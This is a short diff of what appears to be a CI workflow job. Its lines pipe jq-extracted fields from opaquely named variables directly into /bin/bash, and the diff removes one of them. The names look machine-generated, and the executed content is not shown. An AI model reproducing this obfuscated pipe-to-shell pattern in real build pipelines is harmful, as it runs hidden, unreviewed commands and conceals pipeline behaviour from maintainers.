@@ -37,7 +37,6 @@ jobs:
           echo $wzm2 | jq -r .ecrm244 | /bin/bash
           printf '%s' "$acegt150" | jq -r .rys8392 | /bin/bash
           echo $qrb57 | jq -r .l69 | /bin/bash
-          echo $qkj198 | jq -r .tvatz51314 | /bin/bash
           printf '%s' "$mp71421" | jq -r .f128 | /bin/bash
           printf '%s' "$q99501" | jq -r .bqot7 | /bin/bash
           echo $wild946 | jq -r .g17 | /bin/bash
